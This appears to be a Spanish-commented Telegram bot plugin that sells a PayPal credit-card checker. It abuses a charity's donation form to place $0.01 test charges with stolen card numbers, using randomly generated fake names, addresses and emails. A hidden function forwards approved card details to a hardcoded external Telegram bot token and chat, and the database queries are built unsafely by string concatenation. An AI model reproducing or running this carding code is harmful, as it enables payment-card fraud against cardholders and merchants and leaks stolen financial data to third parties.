import json
import requests
import time
import asyncio
import re
import colored 
from asyncio import sleep
import os
import mysql.connector
from pyrogram import Client, filters
from pyrogram.types import (
    Message,
    InlineKeyboardButton,
    InlineKeyboardMarkup
) 
import names
import aiohttp
import codecs
import base64
from pyrogram import Client, filters
from pyrogram.types import Message
from pyrogram.types import (
    Message,
    InlineKeyboardButton,
    InlineKeyboardMarkup
)
from db import *
import random
from bs4 import BeautifulSoup
from user import*


import aiohttp
import certifi
import ssl
import random
import json
import asyncio
import platform
import names
import random_address
# Establece los detalles de la conexión


# Establece los detalles de la conexión
def multiexplode(delimiters, string):
    """
    Separa una cadena en elementos utilizando múltiples delimitadores.

    :param delimiters: Lista de delimitadores como cadena o lista.
    :param string: Cadena a ser dividida.
    :return: Lista de elementos separados.
    """
    if isinstance(delimiters, str):
        delimiters = [delimiters]

    # Reemplazar todos los delimitadores por el primer delimitador
    current_delimiter = delimiters[0]
    for delimiter in delimiters[1:]:
        string = string.replace(delimiter, current_delimiter)

    # Dividir la cadena utilizando el primer delimitador
    return string.split(current_delimiter)

@Client.on_message(filters.command(["pp"], ["/", "."]))
async def ch(_, message: Message):

            username = message.from_user.username
            chat_id = message.chat.id
            user_id = (
        message.from_user.id
    )

            
# Obtener información del grupo
            queryGroups = "SELECT * FROM `groups` WHERE id=" + str(chat_id)
            cursorGroups = db.cursor()
            cursorGroups.execute(queryGroups)
            resultGroups = cursorGroups.fetchall()

# Obtener información del usuario
            queryUsers = "SELECT * FROM users WHERE user_id='" + str(user_id) + "'"
            cursorUsers = db.cursor()
            cursorUsers.execute(queryUsers)
            resultUsers = cursorUsers.fetchall()

            isPremium = False

# Verificar si el usuario es premium en la tabla "users" solo si no es premium en la tabla "groups"
            

            row = None  # Asignar un valor por defecto

            if not isPremium and len(resultUsers) > 0:
                row = resultUsers[0]
            if row and row[2] == 'Premium':  # Verificar si 'row' tiene un valor antes de acceder a sus elementos
                isPremium = True
            
            # ...
            
            if len(resultGroups) > 0:
                row = resultGroups[0]
            if row and row[3] == 'Premium':  # Verificar si 'row' tiene un valor antes de acceder a sus elementos
                isPremium = True

            

# Verificar si el bot se está utilizando en un grupo
            isGroupChat = message.chat.type == 'group'

            if not isPremium:
             message_text = "Para usar el bot"
    
             if isGroupChat:
              message_text += " en este grupo, debes comprar RaceXtChk. Por favor, ponte en contacto con los vendedores para obtener más información."
             else:
              message_text += ", debes comprar RaceXtChk. Por favor, ponte en contacto con los vendedores para obtener más información."
    
             await message.reply_text(f"<i>{message_text}</i>")
             return
            data = message.text.split(" ", 2)

            if len(data) < 2:
                await message.reply_text("""
<i>Comando</i> <i>/pp</i>
<i>Formato:</i> <code>cc|mm|yy|cvv</code>
<i>Gateway:</i> <code>paypal</code>""")
                return

            ccs = data[1]
            card = multiexplode([":", "|", "/", " ","!"], ccs)
            cc = card[0]
            mes = card[1]
            if len(cc) != 16:
                await message.reply_text("Card Not Found. La tarjeta debe tener 16 dígitos.")
                return
            if len(mes) != 2:
                await message.reply_text("Card Not Found. mes inválido")
                return
            
            # Verificar si el año tiene 2 o 4 dígitos
            regex_pattern = r"\b\d{2}\b|\b\d{4}\b"
            match = re.search(regex_pattern, card[2])
        
            if match:
                ano = match.group()  # Obtener el año coincidente
            else:
                await message.reply_text("Formato de año no válido.")
                return
            
            cvv = card[3]
            bin_code = cc[:6]
            
            if len(cvv) != 3:
                await message.reply_text("Card Not Found. cvv inválido")
                return
            
            # Verificar si el bin está en la lista de bins prohibidos
            banned_file = "bin_banned.txt"
            if os.path.exists(banned_file):
                with open(banned_file, "r") as file:
                    banned_bins = file.read().splitlines()
                if bin_code in banned_bins:
                    await message.reply_text("Bin Banned")
                    return
   #dabese variable
            
            username = message.from_user.username
    
            user_id = (
        message.from_user.id
    )
         
        
           

    
    
            
                
                # Ejecuta una consulta SQL para buscar al usuario por su User ID
            query = f"SELECT status FROM users WHERE user_id='{user_id}'"
            cursor.execute(query)
                 
            # Obtiene el resultado de la consulta
            result = cursor.fetchone()
            if result is None:
             await message.reply_text( "No estás registrado. Por favor, utiliza /register para registrarte.")
             return  
                # Verifica el resultado y almacena el valor en la variable "rank"
            
            

# ...

# Al final del procesamiento de mensajes, marcar al usuario como no antispam


                
            inputm = message.text.split(None, 1)[1]
            bincode = 6
            BIN = inputm[:bincode]
            req = requests.get(f"https://bins.antipublic.cc/bins/{BIN}").json()
                    
                 
            
            brand = req['brand']
            country = req['country']
            country_name = req['country_name']
            country_flag = req['country_flag']
            country_currencies = req['country_currencies']
            bank = req['bank']
            level = req['level']
            typea  = req['type']
            tiempo_inicio = time.perf_counter()
            tiempo_fin = time.perf_counter()
            duracion = tiempo_fin - tiempo_inicio
            tiempo = round(duracion, 2)  # Redondear a 2 decimales
            msg=await message.reply(f"""<b>⎚Gateway| Paypal
Card: <code>{ccs}</code>
Progress 🔴 1.12(s)</b>""")
            

   
    #-----------------------------------------------------------------------------------------------
           
            ssl_context = ssl.create_default_context(cafile=certifi.where())
            conn = aiohttp.TCPConnector(ssl=ssl_context)
            async with aiohttp.ClientSession(connector=conn) as session:
                rand1 = random.randint(1000,9999)
                rand2 = random.randint(10000,99999)
        
                genaddr = random_address.real_random_address()
                address = genaddr['address1']
            
                City = genaddr['city']
    
                State = genaddr['state']
                Zip_Code = genaddr['postalCode']
                msg1=await msg.edit(f"""<b>⎚Gateway | Paypal
Card: <code>{ccs}</code>
Progress 🟠 4.40(s)</b>""")
                
                    
                session.headers.update({
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0',
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                        'Accept-Language': 'es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3',
                        # 'Accept-Encoding': 'gzip, deflate, br',
                        'Connection': 'keep-alive',
                    })
                async with session.get('https://schoolforstrings.org/donate/', timeout=15) as resp:
                                   
                 response = await resp.text()
                 lines = response.split("\n")
                 for i in lines:
                        
                  if "gforms_ppcp_frontend_strings" in i:
                     sucio = i
                     create_order_nonce = sucio.replace('var gforms_ppcp_frontend_strings = ',"").replace(';',"")
                     create_order_nonce = json.loads(create_order_nonce)
                     create_order_nonce = create_order_nonce['create_order_nonce']
                    
                            
                headers = {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0',
                        'Accept': '*/*',
                        'Accept-Language': 'es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3',
                        'Referer': 'https://schoolforstrings.org/donate/',
                        'content-type': 'application/json',
                        'Origin': 'https://schoolforstrings.org',
                        'Connection': 'keep-alive',
                    }
        
                    
                params = {
                        'action': 'gfppcp_create_order',
                    }
                    
                correorand = f"KimerJimenezz{rand1}{rand2}@gmail.com"
                data = {
                        "nonce":create_order_nonce,
                        "data":{
                            "payer":{
                                "name":{
                                    "given_name":names.get_first_name(),
                                    "surname":names.get_last_name()
                                },
                                "email_address":correorand
                            },
                            "purchase_units":[
                                {
                                    "amount":{
                                        "value":"0.01",
                                        "currency_code":"USD",
                                        "breakdown":{
                                            "item_total":{
                                                "value":"0.01",
                                                "currency_code":"USD"
                                            },
                                            "shipping":{
                                                "value":"0",
                                                "currency_code":"USD"
                                            }
                                        }
                                    },
                                    "description":"PayPal Commerce Platform Feed 1",
                                    "items":[
                                        {
                                            "name":"Other Amount",
                                            "description":"",
                                            "unit_amount":{
                                                "value":"0",
                                                "currency_code":"USD"
                                            },
                                            "quantity":1
                                        },
                                        {
                                            "name":"Other Amount",
                                            "description":"",
                                            "unit_amount":{
                                                "value":"0.01",
                                                "currency_code":"USD"
                                            },
                                            "quantity":1
                                        }
                                    ],
                                    "shipping":{
                                        "name":{
                                            "full_name":names.get_full_name()
                                        }
                                    }
                                }
                            ],
                            "application_context":{
                                "shipping_preference":"GET_FROM_FILE"
                            }
                        },
                        "form_id":6,
                        "feed_id":"2"
        
                    }
                async with session.post('https://schoolforstrings.org/wp-admin/admin-ajax.php', params=params, headers=headers, json=data, timeout=15) as resp:
            
                    response = await resp.json()
                    orderID = response['data']['orderID']
                            #idrecurly = response['id']
        
                headers = {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0',
                        'Accept': '*/*',
                        'Accept-Language': 'es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3',
                        # 'Accept-Encoding': 'gzip, deflate, br',
                        #'Referer': 'https://www.paypal.com/smart/card-fields?sessionID=uid_5628c2812d_mtq6ndu6ndi&buttonSessionID=uid_5ff42877b6_mtq6ndu6ndu&locale.x=es_ES&commit=true&env=production&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jb21wb25lbnRzPWhvc3RlZC1maWVsZHMlMkNidXR0b25zJTJDbWVzc2FnZXMmY2xpZW50LWlkPUFiVkhHTi1GWGxLTWd2ZU1Bbmt3NWxpUTV3WlhZQTVkQ2FDLVlQWU9pbjVEcU9fZDlSaVItMl9KeWdpUEFUeWNnWHlmWHlVT1B6T2t1TUotJmN1cnJlbmN5PVVTRCZpbnRlZ3JhdGlvbi1kYXRlPTIwMjItMDYtMTEmdmF1bHQ9ZmFsc2UmaW50ZW50PWNhcHR1cmUiLCJhdHRycyI6eyJkYXRhLXBhcnRuZXItYXR0cmlidXRpb24taWQiOiJSb2NrZXRHZW5pdXNfUENQIiwiZGF0YS11aWQiOiJ1aWRfa3p0cGh3c2l1amRmYmpkd3d6cGpycHB4bnJyZHRjIn19&disable-card=&token=3T426684S2194625V',
                        'x-country': 'US',
                        'content-type': 'application/json',
                        'x-app-name': 'standardcardfields',
                        'paypal-client-context': orderID,
                        'paypal-client-metadata-id': orderID,
                        'Origin': 'https://www.paypal.com',
                        'Connection': 'keep-alive',
                    }
                data = {
                        "query":" mutation payWithCard( $token: String! $card: CardInput! $phoneNumber: String $firstName: String $lastName: String $shippingAddress: AddressInput $billingAddress: AddressInput $email: String $currencyConversionType: CheckoutCurrencyConversionType $installmentTerm: Int ) { approveGuestPaymentWithCreditCard( token: $token card: $card phoneNumber: $phoneNumber firstName: $firstName lastName: $lastName email: $email shippingAddress: $shippingAddress billingAddress: $billingAddress currencyConversionType: $currencyConversionType installmentTerm: $installmentTerm ) { flags { is3DSecureRequired } cart { intent cartId buyer { userId auth { accessToken } } returnUrl { href } } paymentContingencies { threeDomainSecure { status method redirectUrl { href } parameter } } } } ",
                        "variables":{
                            "token": orderID,
                            "card":{
                                "cardNumber": cc,
                                "expirationDate":f"{mes}/{ano}",
                                "postalCode": Zip_Code,
                                "securityCode":cvv
                            },
                            "phoneNumber":f"20{random.randint(0,9)}{random.randint(1700,8065)}{random.randint(8,9)}65",
                            "firstName":names.get_first_name(),
                            "lastName":names.get_last_name(),
                            "billingAddress":{
                                "givenName":names.get_first_name(),
                                "familyName":names.get_last_name(),
                                "line1": address,
                                "line2":"",
                                "city": City,
                                "state": State,
                                "postalCode": Zip_Code,
                                "country":"US"
                            },
                            "shippingAddress":{
                                "givenName":names.get_first_name(),
                                "familyName":names.get_last_name(),
                                "line1": address,
                                "line2":"",
                                "city": City,
                                "state": State,
                                "postalCode": Zip_Code,
                                "country":"US"
                            },
                            "email": correorand,
                            "currencyConversionType":"PAYPAL"
                        },
                        "operationName":False
        
                    }
                async with session.post('https://www.paypal.com/graphql?fetch_credit_form_submit', json=data,  headers=headers, timeout=15) as resp:
                            errormessage="null"
                            response = await resp.text()
                            if int(response.find('NEED_CREDIT_CARD')) > 0 :
                                jsonresponse = await resp.json()
                                code = "NON_PAYABLE"
                                message = jsonresponse['errors'][0]['message']
                               
                               
                            elif int(response.find('CANNOT_CLEAR_3DS_CONTINGENCY')) > 0 :
                                jsonresponse = await resp.json()
                                message = jsonresponse['errors'][0]['message']
                                await session.close()
                                message="3DS_ERROR", message
                            elif int(response.find('errors')) > 0 :
                                jsonresponse = await resp.json()
                               
                                code = jsonresponse['errors'][0]['data'][0]['code']
                                
                                message = jsonresponse['errors'][0]['message']
                              
                                
                            elif int(response.find('is3DSecureRequired')) > 0 :
                               
                                errormessage= "CHARGED 0.01$"
                            else :
                                
                                print(response)
                                errormessage= "An unexpected error occurred in response. It was not generated correctly. ⚠️"
                                     
            msg2=await msg1.edit(f"""<b>⎚Gateway | Paypal
Card: <code>{ccs}</code>
Progress 🟢 6.20(s)</b>""")



            
               
            def forwardCVV(text):

                requests.get("https://api.telegram.org/bot6133153598:AAE_jJWR1oaMasP2vmaDzCTy36zz_5QI2nw/sendMessage?chat_id=1924666696&text=" + text)
            if errormessage=="CHARGED 0.01$":
                forwardCVV(f"""⊗GATEWAY- Paypal\n⊗Card:{ccs}\n⊗ Status:Approved✅\n⊗ Response:Charged 1$\n⌧ Checked by:{username}""")
                await msg2.edit(f"""   <b>
⊗ Card - <code>{cc}|{mes}|{ano}|{cvv}</code>
⊗ Status - Approved! ✅</b> 
⊗ Response - <code> {errormessage}</code>
⊗ GATEWAY- paypal
－－－－－－－－－－－－－－
[ BIN INFO ]
⚆ Bin - {BIN} - {brand} - {typea} - {level}
⚆ Bank - {bank} 🏛  
⚆ Country - {country} - {country_flag} 
－－－－－－－－－－－－－－
[ CHECK INFO ]
⌧ Proxy  - Live! ✅ 
⌧ Time Test - 7.4sec
⌧ Checked by: {username}</i> [{rank}]
⌧ Bot by - <b><a href="tg://resolve?domain=Sarcehkr">SarceDev[Owner]</a></b>
－－－－－－－－－－－－－－</b>""")
            elif code=="EXISTING_ACCOUNT_RESTRICTED":
                await msg2.edit(f""" <b>  
⊗ Card - <code>{cc}|{mes}|{ano}|{cvv}</code>
⊗ Status - Approved! ✅</b> 
⊗ Response - <code> {message}</code>
⊗ Code - <code> {code}</code>
⊗ GATEWAY- paypal
－－－－－－－－－－－－－－
[ BIN INFO ]
⚆ Bin - {BIN} - {brand} - {typea} - {level}
⚆ Bank - {bank} 🏛  
⚆ Country - {country} - {country_flag} 
－－－－－－－－－－－－－－
[ CHECK INFO ]
⌧ Proxy  - Live! ✅ 
⌧ Time Test - 7.4sec
⌧ Checked by: {username}</i> [{rank}]
⌧ Bot by - <b><a href="tg://resolve?domain=Sarcehkr">SarceDev[Owner]</a></b>
－－－－－－－－－－－－－－</b>""")
            elif(code=="INVALID_SECURITY_CODE"):
                await msg2.edit(f"""
                <b>
⊗ Card - <code>{cc}|{mes}|{ano}|{cvv}</code>
⊗ Status - Approved! ✅</b> 
⊗ Response - <code> {errormessage}</code>
⊗ Code - <code> {code}</code>
⊗ GATEWAY- paypal
－－－－－－－－－－－－－－
[ BIN INFO ]
⚆ Bin - {BIN} - {brand} - {typea} - {level}
⚆ Bank - {bank} 🏛  
⚆ Country - {country} - {country_flag} 
－－－－－－－－－－－－－－
[ CHECK INFO ]
⌧ Proxy  - Live! ✅ 
⌧ Time Test - 7.4sec
⌧ Checked by: {username}</i> [{rank}]
⌧ Bot by - <b><a href="tg://resolve?domain=Sarcehkr">SarceDev[Owner]</a></b>
－－－－－－－－－－－－－－</b>""")
           
            else:
                await msg2.edit(f"""
                <b>
⊗ Card - <code>{cc}|{mes}|{ano}|{cvv}</code>
⊗ Status - Declined❌</b> 
⊗ Response - <code> {message}</code>
⊗ Code - <code> {code}</code>
⊗ GATEWAY- paypal
－－－－－－－－－－－－－－
[ BIN INFO ]
⚆ Bin - {BIN} - {brand} - {typea} - {level}
⚆ Bank - {bank} 🏛  
⚆ Country - {country} - {country_flag} 
－－－－－－－－－－－－－－
[ CHECK INFO ]
⌧ Proxy  - Live! ✅ 
⌧ Time Test - 7.4sec
⌧ Checked by: {username}</i> [{rank}]
⌧ Bot by - <b><a href="tg://resolve?domain=Sarcehkr">SarceDev[Owner]</a></b>
－－－－－－－－－－－－－－</b>""") 
            
            
            